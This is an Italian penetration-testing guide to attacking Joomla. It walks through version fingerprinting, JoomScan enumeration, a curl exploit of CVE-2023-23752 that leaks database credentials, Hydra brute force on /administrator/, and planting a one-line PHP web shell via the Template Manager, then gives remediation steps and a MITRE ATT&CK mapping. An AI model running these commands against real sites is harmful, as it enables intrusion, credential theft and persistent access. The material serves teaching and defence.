# CMS Exploitation: Joomla & JoomScan

> - **Fase:** Web Attack - CMS Exploitation (Joomla)
> - **Visibilita:** Media (JoomScan) / Bassa (CVE-2023-23752 via singola richiesta curl)
> - **Prerequisiti:** Joomla identificato dalla fase di tech profiling, versione 4.0.0-4.2.7 per CVE-2023-23752
> - **Output:** Versione Joomla, lista componenti con CVE, credenziali database (CVE-2023-23752), potenziale accesso admin

---

## Introduzione

Joomla e il secondo CMS piu diffuso al mondo, con una presenza significativa in ambienti istituzionali, governativi e universitari. La sua architettura a componenti (equivalenti dei plugin WordPress) introduce una superficie di attacco simile: vulnerabilita che raramente riguardano il core, ma molto frequentemente i componenti di terze parti.

Joomla presenta alcune caratteristiche che lo rendono un target interessante nel contesto del penetration testing:

- **Pannello admin esposto:** il pannello di amministrazione e sempre raggiungibile su `/administrator/`, non richiede enumerazione.
- **Autenticazione centralizzata:** tutte le funzionalita amministrative passano per un singolo endpoint di login, facilitando il brute force.
- **API REST nativa:** dalla versione 3.8, Joomla include un'API REST. In alcune versioni (4.0.0-4.2.7), questa API e vulnerabile a information disclosure critica (CVE-2023-23752).
- **File di versione accessibili:** il file `CHANGELOG.txt` nella root del sito espone la versione esatta.

---

## Fase 1: Fingerprinting

Il primo obiettivo e confermare che il target usa Joomla e identificarne la versione.

```Bash
# Identificazione con WhatWeb
whatweb -v http://<TARGET>

# Verifica versione tramite file pubblico
curl -s http://<TARGET>/CHANGELOG.txt | head -5

# Meta tag nel codice sorgente
curl -s http://<TARGET> | grep -i "generator"
```

Output di esempio (CHANGELOG.txt):

```
Joomla! 4.2.6 Changelog
==========
...
```

Output di esempio (meta tag):

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

La versione nel CHANGELOG permette il mapping diretto con le CVE note nel National Vulnerability Database (NVD).

---

## Fase 2: Enumerazione con JoomScan

JoomScan e il tool OWASP dedicato a Joomla: enumera la versione, i componenti installati (con CVE), i file di configurazione esposti e le misconfiguration comuni.

```Bash
# Installazione (Kali Linux)
sudo apt install joomscan -y

# Scansione standard
joomscan -u http://<TARGET>

# Scansione con enumerazione componenti
joomscan -u http://<TARGET> --enumerate-components
```

Output di esempio:

```
    ____  _____  __  __  __  _____  ___   __    _  _
   (_  _)(  _  )(  \/  )(  )/ ___/ / __) /__\  ( \( )
  .-_)(   )(_)(  )    (  )( \___  ( (_-. /(__)\  )  (
  \____) (_____)(__)(__)(__)(_____/ \___/(__)(__)(_)\_)
                        (1.0.2)
    --=[OWASP JoomScan
    +---++---==[Version : 1.0.2

[+] Detecting Joomla Version
[++] Joomla 4.2.6                                    <-- versione rilevata

[+] Checking for vulnerable Joomla Extensions
[!!] Extension: com_fields (Joomla 3.7 SQL Injection) - CVE-2017-8917   <-- CVE trovata
   URL: http://target.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml

[+] Checking for backup files
[++] backup files found                               <-- file di backup esposti
   http://target.com/configuration.php.bak
   http://target.com/config.php.old
```

---

## Fase 3: CVE-2023-23752 - Information Disclosure via API REST

CVE-2023-23752 e una vulnerabilita critica che colpisce Joomla dalla versione 4.0.0 alla 4.2.7. Permette a un attaccante non autenticato di accedere alle configurazioni del database dell'applicazione tramite l'API REST.

**Versioni vulnerabili:** Joomla 4.0.0 - 4.2.7
**CVSS v3.1:** 5.3 (MEDIUM) - ma l'impatto pratico e molto superiore per via delle credenziali esposte.

```Bash
# Test di vulnerabilita: richiesta singola all'endpoint API
curl -s "http://<TARGET>/api/index.php/v1/config/application?public=true" | python3 -m json.tool
```

Output di esempio (endpoint vulnerabile):

```json
{
  "data": {
    "type": "application",
    "id": "4",
    "attributes": {
      "db_type": "mysql",
      "db_host": "localhost",
      "db_user": "joomla_user",
      "db_name": "joomla_db",
      "db_password": "P@ssw0rd123!",           <-- CREDENZIALI DATABASE IN CHIARO
      "db_prefix": "yf62j_",
      "live_site": "",
      "secret": "aBcDeFgHiJkLmNoPqRsTuVwXyZ",  <-- SECRET KEY APPLICAZIONE
      "debug": false,
      ...
    }
  }
}
```

Con le credenziali del database, l'attaccante puo:
1. Connettersi direttamente al database (se MySQL e accessibile dall'esterno).
2. Usare le credenziali per il login al pannello admin (molti admin usano le stesse credenziali).
3. Accedere a tutti i dati degli utenti del sito.

---

## Fase 4: Brute Force sul Pannello Admin

Se CVE-2023-23752 non e applicabile o le credenziali database non permettono l'accesso al pannello, si puo tentare il brute force su `/administrator/`:

```Bash
# Con Hydra su form HTTP POST Joomla
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid username and password or user is blocked."

# Nota: la stringa "Invalid username and password or user is blocked." e il messaggio di errore
# da cercare. Adattare in base alla versione e alla lingua del sito.
```

---

## Fase 5: Post-Authentication

Con accesso admin al pannello Joomla:

```Bash
# Deploy Web Shell tramite Template Manager
# Extensions -> Templates -> <TEMPLATE> -> new file -> shell.php
# Contenuto: <?php system($_GET['cmd']); ?>
# Accesso: http://<TARGET>/templates/<TEMPLATE>/shell.php?cmd=id
```

---

## Remediation

- **Aggiornamento immediato:** aggiornare Joomla alla versione 4.2.8 o superiore (patch CVE-2023-23752). Il fix e stato rilasciato il 16/02/2023.
- **Disabilitare API REST:** se non utilizzata, disabilitare l'API REST in `Global Configuration -> Server -> Web Services API`.
- **Componenti obsoleti:** rimuovere tutti i componenti Joomla non utilizzati o non aggiornati. Ogni componente e un potenziale vettore.
- **Login admin:** abilitare 2FA sul pannello `/administrator/` (Joomla include un plugin 2FA nativo dalla versione 3.x). Considerare IP allowlisting per l'accesso admin.
- **File esposti:** rimuovere `CHANGELOG.txt`, `README.txt`, file `.bak` e `.old` dalla root del sito.
- **Verifica:** dopo il patching, rieseguire il curl su `/api/index.php/v1/config/application?public=true` e verificare che risponda con `403 Forbidden`.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `joomscan` | Joomla scanner | CLI - Attiva | Enumerazione versione, componenti, file esposti |
| `droopescan` | CMS scanner | CLI - Attiva | Alternativa a JoomScan, supporta anche Drupal |
| `nuclei` | Template-based | CLI - Attiva | Template CVE-2023-23752 e altre CVE Joomla |
| `hydra` | Password cracker | CLI - Attiva | Brute force su `/administrator/` |
| `metasploit` | Exploitation framework | CLI/GUI | Moduli specifici per CVE Joomla |
| `curl` | HTTP client | CLI | Test manuale CVE-2023-23752 (singola richiesta GET) |

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Reconnaissance | Active Scanning: Vulnerability Scanning | `T1595.002` | Scansione con JoomScan per identificare la versione Joomla e i componenti vulnerabili |
| Reconnaissance | Gather Victim Host Info: Software | `T1592.002` | Fingerprinting della versione Joomla tramite `CHANGELOG.txt` e meta tag HTML |
| Initial Access | Exploit Public-Facing Application | `T1190` | Sfruttamento di CVE-2023-23752 sull'API REST di Joomla per ottenere le credenziali del database |
| Credential Access | Brute Force: Password Guessing | `T1110.001` | Attacco dizionario su `/administrator/` con Hydra |
| Discovery | File and Directory Discovery | `T1083` | Identificazione di file di configurazione e backup esposti (`configuration.php.bak`) |
| Persistence | Server Software Component: Web Shell | `T1505.003` | Deploy di Web Shell PHP tramite il Template Manager di Joomla dopo accesso admin |
| Collection | Data from Information Repositories | `T1213` | Accesso alle credenziali del database e ai dati degli utenti tramite CVE-2023-23752 |

---

> **Nota:** Le tecniche documentate in questa guida fanno riferimento a CVE pubblicamente note
> e sono state praticate su istanze Joomla installate in ambienti di laboratorio locali e su
> piattaforme di pratica autorizzate. CVE-2023-23752 e stata patchata nella versione 4.2.8
> rilasciata il 16/02/2023. L'utilizzo di queste tecniche su istanze Joomla reali senza
> autorizzazione scritta e un reato penale.
